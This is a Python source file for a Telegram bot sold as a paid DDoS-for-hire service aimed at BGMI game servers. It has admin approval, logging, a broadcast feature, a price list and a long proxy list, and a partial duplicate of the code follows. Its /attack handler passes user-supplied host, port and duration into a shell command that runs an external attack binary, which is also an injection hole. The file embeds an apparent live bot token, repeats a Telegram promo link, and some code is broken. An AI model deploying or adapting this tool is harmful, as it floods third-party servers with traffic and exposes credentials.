
























































# Join :- https://t.me/+mE3JOxZoYitlNzJl # bgmiddoserpython

import telebot
import subprocess
import requests
import datetime
import os

# Join :- https://t.me/+mE3JOxZoYitlNzJl #from keep_alive import keep_alive
# Join :- https://t.me/+mE3JOxZoYitlNzJl #keep_alive()
# Join :- https://t.me/+mE3JOxZoYitlNzJl # insert your Telegram bot token here
bot = telebot.TeleBot('7486292292:AAF4SkKsmtfh3fPY63MWAb48RT6_a9zEmfM')

#  Join :- https://t.me/+mE3JOxZoYitlNzJl # Admin user IDs
admin_id = ["1317362624","879527917","6572028150"]

# join :- https://t.me/+mE3JOxZoYitlNzJl # File to store allowed user IDs
USER_FILE = "users.txt"

# Join :- https://t.me/+mE3JOxZoYitlNzJl # File to store command logs
LOG_FILE = "log.txt"


# Join :- https://t.me/+mE3JOxZoYitlNzJl# List of proxy addresses
PROXIES = [
"https://172.183.241.1:8080",
"https://89.105.220.130:3128",
"https://34.122.187.196:80",
"https://50.173.182.90:80",
"https://50.230.222.202:80",
"https://50.223.239.185:80",
"https://50.223.239.183:80",
"https://50.223.239.167:80",
"https://50.168.72.116:80",
"https://50.222.245.44:80",
"https://50.231.172.74:80",
"https://50.222.245.42:80",
"https://50.168.72.112:80",
"https://50.222.245.43:80",
"https://50.223.246.237:80",
"https://50.223.239.175:80",
"https://50.222.245.40:80",
"https://50.222.245.41:80",
"https://50.174.145.14:80",
"https://50.222.245.50:80",
"https://66.29.154.105:3128",
"https://50.168.72.122:80",
"https://50.223.239.194:80",
"https://50.223.239.161:80",
"https://50.144.168.74:80",
"https://50.222.245.45:80",
"https://50.223.239.160:80",
"https://50.171.177.124:80",
"https://50.222.245.46:80",
"https://50.175.212.66:80",
"https://50.223.246.226:80",
"https://50.223.239.191:80",
"https://50.168.163.176:80",
"https://50.168.72.119:80",
"https://50.175.212.74:80",
"https://50.169.37.50:80",
"https://50.174.145.15:80",
"https://50.174.145.11:80",
"https://50.172.75.120:80",
"https://50.175.212.72:80",
"https://50.172.75.121:80",
"https://50.172.75.125:80",
"https://50.223.38.6:80",
"https://50.174.145.13:80",
"https://50.172.75.126:80",
"https://50.221.230.186:80",
"https://50.172.75.123:80",
"https://50.222.245.47:80",
"https://198.199.86.11:8080",
"https://50.174.7.153:80",
"https://50.168.163.179:80",
"https://50.174.7.154:80",
"https://50.174.7.156:80",
"https://50.174.7.152:80",
"https://50.231.110.26:80",
"https://50.168.163.177:80",
"https://50.168.72.117:80",
"https://50.217.226.45:80",
"https://50.174.7.157:80",
"https://50.239.72.18:80",
"https://50.217.226.43:80",
"https://50.221.74.130:80",
"https://50.168.72.118:80",
"https://50.168.72.114:80",
"https://50.168.163.183:80",
"https://50.207.199.81:80",
"https://216.137.184.253:80",
"https://35.185.196.38:3128",
"https://50.207.199.82:80",
"https://50.168.72.113:80",
"https://50.207.199.87:80",
"https://50.217.226.40:80",
"https://50.168.72.115:80",
"https://50.239.72.16:80",
"https://50.202.75.26:80",
"https://50.174.7.155:80",
"https://50.168.163.166:80",
"https://50.168.7.250:80",
"https://50.218.204.103:80",
"https://50.145.24.186:80",
"https://50.217.226.42:80",
"https://65.49.38.202:81",
"https://24.205.201.186:80",
"https://12.176.231.147:80",
"https://50.175.212.77:80",
"https://50.223.239.190:80",
"https://50.174.7.158:80",
"https://50.168.163.182:80",
"https://50.217.226.44:80",
"https://50.172.75.124:80",
"https://50.174.145.9:80",
"https://32.223.6.94:80",
"https://68.185.57.66:80",
"https://50.239.72.17:80",
"https://50.168.163.178:80",
"https://50.217.226.47:80",
"https://50.217.226.46:80",
"https://50.223.239.173:80",
"https://23.122.184.9:8888",
"https://104.165.127.74:3128",
"https://154.202.125.133:3128",
"https://77.83.27.130:8085",
"https://194.99.24.170:8085",
"https://154.202.114.115:3128",
"https://104.165.127.233:3128",
"https://146.19.39.113:8085",
"https://154.202.107.34:3128",
"https://154.202.118.130:3128",
"https://104.207.47.141:3128",
"https://45.159.21.179:8085",
"https://161.123.154.30:6560",
"https://142.111.93.207:6768",
"https://146.19.44.166:8085",
"https://193.163.207.56:8085",
"https://104.207.51.191:3128",
"https://154.202.124.84:3128",
"https://154.202.115.46:3128",
"https://104.164.183.226:3128",
"https://104.207.41.4:3128",
"https://154.202.112.213:3128",
"https://146.19.39.176:8085",
"https://66.78.34.52:5671",
"https://154.202.118.221:3128",
"https://156.239.53.244:3128",
"https://104.148.0.226:5581",
"https://193.151.189.109:8085",
"https://38.154.194.85:9498",
"https://198.23.128.73:5701",
"https://104.165.169.64:3128",
"https://154.202.115.116:3128",
"https://154.202.111.184:3128",
"https://154.202.99.132:3128",
"https://154.202.119.33:3128",
"https://154.202.115.32:3128",
"https://154.202.127.177:3128",
"https://104.207.62.54:3128",
"https://156.239.50.43:3128",
"https://154.202.99.95:3128",
"https://104.207.49.186:3128",
"https://154.202.114.205:3128",
"https://154.202.116.117:3128",
"https://154.202.116.217:3128",
"https://156.239.52.180:3128",
"https://154.202.124.206:3128",
"https://154.201.47.179:3128",
"https://154.202.123.233:3128",
"https://154.202.116.185:3128",
"https://46.253.131.118:8085",
"https://88.218.45.205:8085",
"https://88.218.45.35:8085",
"https://136.0.88.122:5180",
"https://62.204.49.174:8085",
"https://212.18.127.225:8085",
"https://156.239.49.143:3128",
"https://162.245.188.220:6179",
"https://178.20.28.169:8085",
"https://193.163.92.48:8085",
"https://212.18.127.187:8085",
"https://154.202.118.201:3128",
"https://62.204.49.68:8085",
"https://136.0.207.125:6702",
"https://154.202.127.87:3128",
"https://156.239.53.136:3128",
"https://77.83.25.165:8085",
"https://77.83.26.50:8085",
"https://193.31.126.108:8085",
"https://154.202.116.191:3128",
"https://154.201.47.121:3128",
"https://104.207.43.7:3128",
"https://156.239.55.56:3128",
"https://104.207.47.40:3128",
"https://104.207.58.178:3128",
"https://104.165.169.104:3128",
"https://104.207.39.242:3128",
"https://104.207.47.165:3128",
"https://154.202.111.171:3128",
"https://198.46.241.32:6567",
"https://154.202.112.229:3128",
"https://104.165.169.65:3128",
"https://154.201.47.244:3128",
"https://104.165.169.247:3128",
"https://45.61.125.10:6021",
"https://104.165.169.233:3128",
"https://154.202.118.117:3128",
"https://206.206.73.227:6843",
"https://156.239.50.19:3128",
"https://154.202.127.5:3128",
"https://104.207.53.50:3128",
"https://156.239.55.202:3128",
"https://146.19.39.195:8085",
"https://170.106.117.131:10800",
"https://23.229.110.204:8732",
"https://154.202.127.225:3128",
"https://45.159.22.159:8085",
"https://178.20.31.179:8085",
"https://37.72.141.74:8085",
"https://154.202.115.228:3128",
"https://156.239.53.55:3128",
"https://104.207.38.238:3128",
"https://156.239.49.52:3128",
"https://154.202.118.130:8085",
"https://104.207.47.141:8085",
"https://45.159.21.179:8085",
"https://146.19.44.166:8085",
"https://193.163.207.56:8085",
"https://154.202.114.205:8085",
"https://46.253.131.118:8085",
"https://88.218.45.205:8085",
"https://88.218.45.35:8085",
"https://62.204.49.174:8085",
"https://212.18.127.225:8085",
"https://193.163.92.48:8085",
"https://212.18.127.187:8085",
"https://62.204.49.68:8085",
"https://77.83.25.165:8085",
"https://77.83.26.50:8085",
"https://193.31.126.108:8085",
"https://45.159.22.159:8085",
"https://178.20.31.179:8085",
"https://37.72.141.74:8085",
    # Join :- https://t.me/+mE3JOxZoYitlNzJl # Add more proxy addresses as needed
]

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['approve'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} approve Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to approve 😒."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /unapprove <userid>'''
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "Only owner Can Run This Command 😡."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only owner Can Run This Command 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "Only owner Can Run This Command 😡."
        bot.reply_to(message, response)


@bot.message_handler(commands=['mychatid'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖YOUR CHAT ID -> {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚀 Attack Sent Successfully.🚀\n\nTarget: {target}\n𝐏𝐨𝐫𝐭: {port}\nduration: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: ASHWIN—VIP-DDOS"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /attack command
bgmi_cooldown = {0}

COOLDOWN_TIME =0

# Handler for /attack command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in user_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "You Are On Cooldown 🙂. Please Wait 5min Before Running The /attack Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 810:
                response = "Error: Time interval must be less than 800."
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./attack {target} {port} {time} 300"
                subprocess.run(full_command, shell=True)
                response = f"Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "/attack <host> <port> <duration>"  # Updated command syntax
    else:
        response = "🚫 Unauthorized Access!🚫Please buy access :- @PRO_LEGE9D"

    bot.reply_to(message, response)



# approve /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌"
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "🚫 Unauthorized Access! 🚫"

    bot.reply_to(message, response)


@bot.message_handler(commands=['menu'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /attack : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.

BUY ACCESS -> @PRO_LEGE9D
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🫡WELCOME TO ASHWIN DDOS BOT 🚀 '''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''
1. ANY PROBLEM DM HERE -> @PRO_LEGE9D'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''🟥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐃𝐃𝐎𝐒 𝐁𝐎𝐓 🟥

𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓 👇

𝟏 𝐃𝐀𝐘 -> 𝟏𝟐𝟎
𝟑 𝐃𝐀𝐘 -> 𝟐𝟏𝟎
𝟕 𝐃𝐀𝐘 -> 𝟒𝟓𝟎
𝟑𝟎 𝐃𝐀𝐘 -> 𝟗𝟎𝟎
𝟔𝟎 𝐃𝐀𝐘 -> 𝟏𝟕𝟎𝟎

𝐃𝐌 𝐓𝐎 𝐁𝐔𝐘 -> @ASHWIN
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['adminship'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /approve <userId> : approve a User.
💥 /unapprove <userid> unapprove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ THIS MESSAGE SEND BY DDOS OWNER:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)




bot.polling()



























import telebot
import subprocess
import requests
import datetime
import os

# Join :- https://t.me/+mE3JOxZoYitlNzJl # Import the 'time' module for sleep functionality
import time

# Join :- https://t.me/+mE3JOxZoYitlNzJl # insert your Telegram bot token here


# Join :- https://t.me/+mE3JOxZoYitlNzJl # File to store allowed user IDs
USER_FILE = "users.txt"

# Join :- https://t.me/+mE3JOxZoYitlNzJl # File to store command logs
LOG_FILE = "log.txt"


def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Join :- https://t.me/+mE3JOxZoYitlNzJl # Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Join :- https://t.me/+mE3JOxZoYitlNzJl # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Join :- https://t.me/+mE3JOxZoYitlNzJl # Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Join :- https://t.me/+mE3JOxZoYitlNzJl # Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")
